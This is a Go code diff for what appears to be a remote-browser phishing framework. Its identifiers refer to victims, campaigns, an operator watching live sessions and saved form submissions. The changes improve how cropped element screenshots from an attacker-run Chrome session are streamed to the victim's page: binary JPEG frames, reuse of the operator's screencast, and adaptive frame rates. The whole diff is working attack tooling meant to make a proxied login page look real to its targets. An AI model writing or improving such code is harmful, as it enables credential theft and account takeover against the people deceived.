@@ -3,7 +3,7 @@ package controller
 import (
 	"bytes"
 	"context"
-	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"image"
@@ -56,6 +56,16 @@ type activeSession struct {
 	// browserPage is set (non-nil) only after newSession() is called.
 	browserPageMu sync.Mutex
 	browserPage   *rod.Page
+	// operator screencast fan-out: when an operator is viewing this session, the
+	// latest full-page screencast frame is published here so victim element streams
+	// crop from it instead of running a second capture on the same target — two
+	// capture mechanisms on one Chrome target corrupt each other (the operator would
+	// otherwise see only the element's clipped region).
+	opMu        sync.RWMutex
+	opPageID    proto.TargetTargetID
+	opFrame     []byte
+	opFrameDevW float64
+	opFrameDevH float64
 }
 
 func (a *activeSession) GetCampaignID() uuid.UUID { return a.CampaignID }
@@ -72,6 +82,36 @@ func (a *activeSession) setBrowserPage(page *rod.Page) {
 	a.browserPageMu.Lock()
 	defer a.browserPageMu.Unlock()
 	a.browserPage = page
+}
+
+// publishOperatorFrame stores the latest operator screencast frame for pageID so
+// victim element streams on that page can crop from it.
+func (a *activeSession) publishOperatorFrame(pageID proto.TargetTargetID, data []byte, devW, devH float64) {
+	a.opMu.Lock()
+	a.opPageID = pageID
+	a.opFrame = data
+	a.opFrameDevW, a.opFrameDevH = devW, devH
+	a.opMu.Unlock()
+}
+
+// clearOperatorFrames stops publishing operator frames when the viewer disconnects.
+func (a *activeSession) clearOperatorFrames() {
+	a.opMu.Lock()
+	a.opPageID = ""
+	a.opFrame = nil
+	a.opMu.Unlock()
+}
+
+// operatorFrameFor returns the latest operator frame and viewport dimensions when an
+// operator is currently screencasting pageID, so an element stream can crop from it
+// instead of issuing its own capture on that target.
+func (a *activeSession) operatorFrameFor(pageID proto.TargetTargetID) ([]byte, float64, float64, bool) {
+	a.opMu.RLock()
+	defer a.opMu.RUnlock()
+	if a.opPageID == "" || a.opPageID != pageID || len(a.opFrame) == 0 {
+		return nil, 0, 0, false
+	}
+	return a.opFrame, a.opFrameDevW, a.opFrameDevH, true
 }
 
 // streamInfo tracks a named cropped stream started by s.stream(selector, name).
@@ -723,7 +763,7 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 					streamCtx, streamCancel := context.WithCancel(cmd.Page.GetContext())
 					si := &streamInfo{cancel: streamCancel, maxFps: cmd.MaxFps, quality: cmd.Quality}
 					activeNamedStreams.Store(cmd.Name, si)
-					go m.runNamedStream(streamCtx, cmd.Page, &connMu, conn, cmd.Selector, cmd.Name, si)
+					go m.runNamedStream(streamCtx, cmd.Page, sess, &connMu, conn, cmd.Selector, cmd.Name, si)
 				} else if cmd.Op == "stop" {
 					if val, exists := activeNamedStreams.LoadAndDelete(cmd.Name); exists {
 						val.(*streamInfo).cancel()
@@ -934,6 +974,9 @@ func (m *RemoteBrowserController) StreamLiveSession(g *gin.Context) {
 		return
 	}
 	defer conn.Close()
+	// Stop feeding element streams once this operator stops viewing, so they fall
+	// back to capturing the element region directly.
+	defer sess.clearOperatorFrames()
 	conn.SetReadLimit(64 * 1024)
 
 	// Derived from outerCtx so the stream also ends when the victim session ends.
@@ -1360,6 +1403,11 @@ func (m *RemoteBrowserController) StreamLiveSession(g *gin.Context) {
 				frameW = frame.Metadata.DeviceWidth
 				frameH = frame.Metadata.DeviceHeight
 			}
+			// Publish the frame so victim element streams on this page crop from it
+			// instead of running a competing capture on the same target.
+			if ap := getActivePage(); ap != nil {
+				sess.publishOperatorFrame(ap.TargetID, frame.Data, frameW, frameH)
+			}
 			// The CSS viewport dimensions (used client side for input coordinate
 			// mapping) change rarely, so send them as a small control message only on
 			// change instead of wrapping every frame. The JPEG itself goes as a raw
@@ -1735,9 +1783,10 @@ func (m *RemoteBrowserController) saveSubmitEvent(
 	}
 }
 
-// cropImage crops an already-decoded image and returns base64 JPEG at the given quality (1-100).
-// quality 0 means use the default (92).
-func cropImage(src image.Image, x, y, w, h, quality int) (string, error) {
+// cropImageJPEG crops src to the given region and returns raw JPEG bytes. Used to
+// crop the streamed element out of an operator screencast frame so the victim only
+// ever receives the element, never the full page. quality 0 uses a sane default.
+func cropImageJPEG(src image.Image, x, y, w, h, quality int) ([]byte, error) {
 	b := src.Bounds()
 	if x < b.Min.X {
 		x = b.Min.X
@@ -1752,19 +1801,32 @@ func cropImage(src image.Image, x, y, w, h, quality int) (string, error) {
 		h = b.Max.Y - y
 	}
 	if w <= 0 || h <= 0 {
-		return "", fmt.Errorf("crop region out of bounds")
+		return nil, fmt.Errorf("crop region out of bounds")
 	}
 	dst := image.NewRGBA(image.Rect(0, 0, w, h))
 	draw.Draw(dst, dst.Bounds(), src, image.Pt(x, y), draw.Src)
-	var buf bytes.Buffer
 	q := quality
 	if q <= 0 || q > 100 {
-		q = 92
+		q = 85
 	}
+	var buf bytes.Buffer
 	if err := jpeg.Encode(&buf, dst, &jpeg.Options{Quality: q}); err != nil {
-		return "", err
+		return nil, err
 	}
-	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
+	return buf.Bytes(), nil
+}
+
+// buildStreamFrameMsg frames a cropped element JPEG for the victim WebSocket as a
+// single binary message: [type=1][uint16 name length][name][jpeg bytes]. Sending the
+// JPEG raw avoids the base64 inflation and per-frame JSON wrapping of a text message.
+func buildStreamFrameMsg(name string, jpegData []byte) []byte {
+	nameBytes := []byte(name)
+	buf := make([]byte, 3+len(nameBytes)+len(jpegData))
+	buf[0] = 1
+	binary.BigEndian.PutUint16(buf[1:3], uint16(len(nameBytes)))
+	copy(buf[3:], nameBytes)
+	copy(buf[3+len(nameBytes):], jpegData)
+	return buf
 }
 
 // runNamedStream queries the element CSS bounding rect, then streams cropped frames to
@@ -1776,6 +1838,7 @@ func cropImage(src image.Image, x, y, w, h, quality int) (string, error) {
 func (m *RemoteBrowserController) runNamedStream(
 	streamCtx context.Context,
 	page *rod.Page,
+	sess *activeSession,
 	connMu *sync.Mutex,
 	conn *websocket.Conn,
 	selector string,
@@ -1802,68 +1865,153 @@ func (m *RemoteBrowserController) runNamedStream(
 	}
 	si.setOrigin(cssRect.X, cssRect.Y)
 
-	// displayW/H: CSS pixel size sent to the victim canvas for layout.
-	// Locked to the element's size at stream-start time; updated only when
-	// the element itself genuinely resizes (cssRectChanged), NOT when
-	// EmulateViewport causes responsive-layout reflow that changes cssRect.W/H.
-	displayW := int(cssRect.W)
-	displayH := int(cssRect.H)
+	// displayW/H: element CSS-pixel size sent to the victim canvas for layout.
+	// imageW/H: the JPEG pixel size Chrome produces for the clip (CSS size times the
+	// capture scale). Both are refreshed whenever the element resizes.
+	displayW := int(cssRect.W + 0.5)
+	displayH := int(cssRect.H + 0.5)
 
 	streamPage := page.Context(streamCtx)
-	frameCh := make(chan *proto.PageScreencastFrame, 4)
-	wait := streamPage.EachEvent(func(e *proto.PageScreencastFrame) (stop bool) {
-		select {
-		case frameCh <- e:
-		default:
-		}
-		return
-	})
-	go wait()
 
-	nsQ, nsW, nsH, nsN := 85, 3840, 2160, 1
-	namedStreamScreencast := proto.PageStartScreencast{
-		Format:        proto.PageStartScreencastFormatJpeg,
-		Quality:       &nsQ,
-		MaxWidth:      &nsW,
-		MaxHeight:     &nsH,
-		EveryNthFrame: &nsN,
-	}
-	if err := namedStreamScreencast.Call(streamPage); err != nil {
-		return
-	}
-	// page (not streamPage) must be used here: streamCtx is already cancelled when this defer
-	// runs, so a StopScreencast on streamPage would never reach Chrome.
-	defer proto.PageStopScreencast{}.Call(page) //nolint:errcheck
-
-	var minInterval time.Duration
-	if si.maxFps > 0 {
-		minInterval = time.Second / time.Duration(si.maxFps)
-	}
-	var lastFrameSent time.Time
-
-	// cropX/Y/W/H are in JPEG pixels, recomputed whenever the JPEG dimensions or
-	// the viewport (DeviceWidth/Height) change. The viewport can change mid-stream
-	// when EmulateViewport is applied after the victim sends their window size.
-	var cropX, cropY, cropW, cropH int
-	var lastJpegW, lastJpegH int
-	var lastDevW, lastDevH float64 // track viewport to detect changes
-	var lastRectCheck time.Time    // throttle for periodic element-size polling
-
-	requeryCSSRect := func(devW, devH float64) {
-		res, err := page.Eval(fmt.Sprintf(`() => (function(){var el=document.querySelector(%q);if(!el)return null;var r=el.getBoundingClientRect();return JSON.stringify({x:r.left,y:r.top,w:r.width,h:r.height})})()`, selector))
+	// scale renders the clip at the remote page's device pixel ratio so the streamed
+	// element stays crisp on HiDPI or emulated viewports. Clamped to a sane range.
+	readScale := func() float64 {
+		res, err := streamPage.Eval(`() => window.devicePixelRatio || 1`)
 		if err != nil {
+			return 1
+		}
+		s := res.Value.Num()
+		if s < 1 {
+			s = 1
+		}
+		if s > 3 {
+			s = 3
+		}
+		return s
+	}
+	scale := readScale()
+	si.setScale(scale, scale)
+
+	imageW := int(cssRect.W*scale + 0.5)
+	imageH := int(cssRect.H*scale + 0.5)
+
+	quality := si.quality
+	if quality <= 0 || quality > 100 {
+		quality = 85
+	}
+
+	// fps caps how often the element is captured. Unbounded (0) would spin the capture
+	// loop, so default to a smooth but cheap rate for a single element.
+	fps := si.maxFps
+	if fps <= 0 {
+		fps = 30
+	}
+
+	// sendStreamStart tells the victim page the current image and CSS dimensions so it
+	// can size its canvas. Sent up front and again whenever the dimensions change.
+	sendStreamStart := func() {
+		startPayload, _ := json.Marshal(map[string]interface{}{
+			"type":      "stream_start",
+			"name":      name,
+			"width":     imageW,
+			"height":    imageH,
+			"cssWidth":  displayW,
+			"cssHeight": displayH,
+		})
+		connMu.Lock()
+		conn.WriteMessage(websocket.TextMessage, startPayload) //nolint:errcheck
+		connMu.Unlock()
+	}
+	sendStreamStart()
+
+	// requeryRect re-reads the element rect and device pixel ratio, updating the crop
+	// origin and the capture scale used by the direct-capture path.
+	requeryRect := func() {
+		res, err := streamPage.Eval(fmt.Sprintf(`() => (function(){var el=document.querySelector(%q);if(!el)return null;var r=el.getBoundingClientRect();return JSON.stringify({x:r.left,y:r.top,w:r.width,h:r.height,dpr:window.devicePixelRatio||1})})()`, selector))
+		if err != nil || res.Value.Str() == "" || res.Value.Str() == "null" {
 			return
 		}
-		if res.Value.Str() == "" || res.Value.Str() == "null" {
+		var r struct{ X, Y, W, H, Dpr float64 }
+		if err := json.Unmarshal([]byte(res.Value.Str()), &r); err != nil || r.W <= 0 || r.H <= 0 {
 			return
 		}
-		var r struct{ X, Y, W, H float64 }
-		if err := json.Unmarshal([]byte(res.Value.Str()), &r); err != nil || r.W <= 0 {
-			return
+		scale = r.Dpr
+		if scale < 1 {
+			scale = 1
 		}
-		cssRect = r
+		if scale > 3 {
+			scale = 3
+		}
+		cssRect = struct{ X, Y, W, H float64 }{r.X, r.Y, r.W, r.H}
 		si.setOrigin(cssRect.X, cssRect.Y)
 	}
+
+	// captureElement returns the current element JPEG plus its pixel dimensions. When
+	// an operator is screencasting this page it crops the element out of the operator's
+	// frame — running our own capture on the same target would corrupt the operator's
+	// full-page view. Otherwise it captures just the element region directly, which is
+	// cheap and leaves the server doing no image codec work.
+	captureElement := func() ([]byte, int, int, bool) {
+		if opData, devW, devH, ok := sess.operatorFrameFor(page.TargetID); ok {
+			src, decErr := jpeg.Decode(bytes.NewReader(opData))
+			if decErr != nil {
+				return nil, 0, 0, false
+			}
+			jw, jh := src.Bounds().Dx(), src.Bounds().Dy()
+			if devW <= 0 {
+				devW = float64(jw)
+			}
+			if devH <= 0 {
+				devH = float64(jh)
+			}
+			sx, sy := float64(jw)/devW, float64(jh)/devH
+			si.setOrigin(cssRect.X, cssRect.Y)
+			si.setScale(sx, sy)
+			cw := int(cssRect.W*sx + 0.5)
+			ch := int(cssRect.H*sy + 0.5)
+			cropped, cropErr := cropImageJPEG(src, int(cssRect.X*sx), int(cssRect.Y*sy), cw, ch, quality)
+			if cropErr != nil {
+				return nil, 0, 0, false
+			}
+			return cropped, cw, ch, true
+		}
+		si.setOrigin(cssRect.X, cssRect.Y)
+		si.setScale(scale, scale)
+		shot, shotErr := proto.PageCaptureScreenshot{
+			Format:  proto.PageCaptureScreenshotFormatJpeg,
+			Quality: &quality,
+			Clip: &proto.PageViewport{
+				X:      cssRect.X,
+				Y:      cssRect.Y,
+				Width:  cssRect.W,
+				Height: cssRect.H,
+				Scale:  scale,
+			},
+			OptimizeForSpeed: true,
+		}.Call(streamPage)
+		if shotErr != nil {
+			return nil, 0, 0, false
+		}
+		return shot.Data, int(cssRect.W*scale + 0.5), int(cssRect.H*scale + 0.5), true
+	}
+
+	// Adaptive polling: capture at fastInterval while the element is changing and back
+	// off to idleInterval once it has been static for a short streak. Interactive
+	// elements stay smooth while a static one barely costs anything; the rate snaps
+	// back to fast the instant a frame differs.
+	fastInterval := time.Second / time.Duration(fps)
+	idleInterval := 200 * time.Millisecond
+	if idleInterval < fastInterval {
+		idleInterval = fastInterval
+	}
+	const backoffAfter = 10 // consecutive unchanged frames before slowing down
+
+	ticker := time.NewTicker(fastInterval)
+	defer ticker.Stop()
+	atFastRate := true
+	unchanged := 0
+	var lastRectCheck time.Time
+	var lastFrame []byte // last JPEG sent, to skip resending unchanged frames
 
 	for {
 		select {
@@ -1873,127 +2021,48 @@ func (m *RemoteBrowserController) runNamedStream(
 			conn.WriteMessage(websocket.TextMessage, stopPayload) //nolint:errcheck
 			connMu.Unlock()
 			return
-		case frame, ok := <-frameCh:
-			if !ok {
-				return
-			}
-			// Always ack to prevent CDP screencast stalling.
-			proto.PageScreencastFrameAck{SessionID: frame.SessionID}.Call(page) //nolint:errcheck
-			// Throttle: drop frames that arrive faster than maxFps.
-			if minInterval > 0 && !lastFrameSent.IsZero() && time.Since(lastFrameSent) < minInterval {
-				continue
-			}
-			lastFrameSent = time.Now()
-
-			var devW, devH float64
-			if frame.Metadata != nil {
-				devW = frame.Metadata.DeviceWidth
-				devH = frame.Metadata.DeviceHeight
-			}
-
-			// Decode JPEG once; reuse for both scale computation and cropping.
-			src, err := jpeg.Decode(bytes.NewReader(frame.Data))
-			if err != nil {
-				continue
-			}
-			jpegW := src.Bounds().Max.X
-			jpegH := src.Bounds().Max.Y
-
-			if devW <= 0 {
-				devW = float64(jpegW)
-			}
-			if devH <= 0 {
-				devH = float64(jpegH)
-			}
-
-			viewportChanged := devW != lastDevW || devH != lastDevH
-			jpegDimsChanged := jpegW != lastJpegW || jpegH != lastJpegH
-
-			// When the viewport changes (e.g. EmulateViewport applied after victim connects),
-			// re-query the element's bounding rect — its CSS position and size may have
-			// changed due to responsive layout reflow.
-			cssRectChanged := false
-			if viewportChanged {
-				lastDevW, lastDevH = devW, devH
-				oldX, oldY, oldW, oldH := cssRect.X, cssRect.Y, cssRect.W, cssRect.H
-				requeryCSSRect(devW, devH)
-				if cssRect.X != oldX || cssRect.Y != oldY || cssRect.W != oldW || cssRect.H != oldH {
-					cssRectChanged = true
-				}
-			}
-
-			// Periodically re-query the element rect to detect size changes caused by
-			// CSS transitions, popups expanding, or other dynamic layout shifts.
-			// Skip when a viewport change already triggered a re-query this frame.
-			if !viewportChanged && cropW > 0 && time.Since(lastRectCheck) >= 250*time.Millisecond {
+		case <-ticker.C:
+			// Periodically re-check the element rect for moves or resizes (CSS
+			// transitions, responsive reflow, popups).
+			if time.Since(lastRectCheck) >= 250*time.Millisecond {
 				lastRectCheck = time.Now()
-				oldX, oldY, oldW, oldH := cssRect.X, cssRect.Y, cssRect.W, cssRect.H
-				requeryCSSRect(devW, devH)
-				if cssRect.X != oldX || cssRect.Y != oldY || cssRect.W != oldW || cssRect.H != oldH {
-					cssRectChanged = true
-				}
+				requeryRect()
 			}
-
-			// Recompute scale-aware crop rect whenever JPEG dimensions, viewport, or
-			// the element's own CSS dimensions change.
-			if jpegDimsChanged || viewportChanged || cssRectChanged {
-				lastJpegW, lastJpegH = jpegW, jpegH
-
-				scaleX := float64(jpegW) / devW
-				scaleY := float64(jpegH) / devH
-				si.setScale(scaleX, scaleY)
-
-				cropX = int(cssRect.X * scaleX)
-				cropY = int(cssRect.Y * scaleY)
-				cropW = int(cssRect.W * scaleX)
-				cropH = int(cssRect.H * scaleY)
-
-				// Update canvas display size only when the element itself resized,
-				// not when a viewport change triggers responsive-layout reflow.
-				if cssRectChanged {
-					displayW = int(cssRect.W)
-					displayH = int(cssRect.H)
-				}
-
-				if cropW <= 0 || cropH <= 0 {
-					continue
-				}
-				// cssWidth/cssHeight: stable CSS display size (locked to initial element
-				// size, updated only on genuine element resize). width/height are the
-				// JPEG crop buffer dimensions, which can differ on HiDPI displays.
-				startPayload, _ := json.Marshal(map[string]interface{}{
-					"type":      "stream_start",
-					"name":      name,
-					"width":     cropW,
-					"height":    cropH,
-					"cssWidth":  displayW,
-					"cssHeight": displayH,
-				})
-				connMu.Lock()
-				conn.WriteMessage(websocket.TextMessage, startPayload) //nolint:errcheck
-				connMu.Unlock()
-			}
-
-			if cropW <= 0 || cropH <= 0 {
+			if cssRect.W <= 0 || cssRect.H <= 0 {
 				continue
 			}
-
-			cropped, err := cropImage(src, cropX, cropY, cropW, cropH, si.quality)
-			if err != nil {
+			data, iw, ih, ok := captureElement()
+			if !ok {
 				continue
 			}
-			payload, err := json.Marshal(map[string]interface{}{
-				"type":   "stream_frame",
-				"name":   name,
-				"frame":  cropped,
-				"width":  cropW,
-				"height": cropH,
-			})
-			if err != nil {
+			// Notify the victim when the image or CSS dimensions change — element
+			// resize, or a switch between the direct-capture and operator-crop paths.
+			dispW := int(cssRect.W + 0.5)
+			dispH := int(cssRect.H + 0.5)
+			if iw != imageW || ih != imageH || dispW != displayW || dispH != displayH {
+				imageW, imageH = iw, ih
+				displayW, displayH = dispW, dispH
+				sendStreamStart()
+			}
+			// Skip the send when the frame is byte-for-byte unchanged (JPEG of identical
+			// pixels is deterministic) and slow the capture rate after a static streak;
+			// resume fast capture the instant a frame differs.
+			if bytes.Equal(data, lastFrame) {
+				unchanged++
+				if unchanged == backoffAfter && atFastRate {
+					atFastRate = false
+					ticker.Reset(idleInterval)
+				}
 				continue
 			}
+			unchanged = 0
+			if !atFastRate {
+				atFastRate = true
+				ticker.Reset(fastInterval)
+			}
+			lastFrame = data
 			connMu.Lock()
-			writeErr := conn.WriteMessage(websocket.TextMessage, payload)
+			writeErr := conn.WriteMessage(websocket.BinaryMessage, buildStreamFrameMsg(name, data))
 			connMu.Unlock()
 			if writeErr != nil {
 				return
